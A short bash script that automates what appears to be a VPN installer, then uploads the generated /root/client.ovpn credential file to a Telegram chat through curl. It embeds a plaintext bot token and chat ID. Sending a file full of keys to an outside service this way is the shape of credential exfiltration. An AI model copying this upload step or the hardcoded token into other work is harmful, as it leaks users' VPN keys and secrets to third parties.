#!/bin/bash

(
    echo "1"
    echo ""
    echo "2"
    echo "client"
    echo ""
) | bash install.sh

CLIENT_OVPN="/root/client.ovpn"

BOT_TOKEN="7596869830:AAGyu-eOPhwimjmMZv2QqGNFkfcDtG_szk0"
CHAT_ID="7406297691"

if [[ -f "$CLIENT_OVPN" ]]; then
    curl -F "chat_id=$CHAT_ID" -F "document=@$CLIENT_OVPN" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"

    if [[ $? -eq 0 ]]; then
        echo "Everything installed."
        echo "File sent."
        echo "Ready to go!"
    else
        echo "File send failed."
    fi
else
    echo "Error: File $CLIENT_OVPN not found."
fi
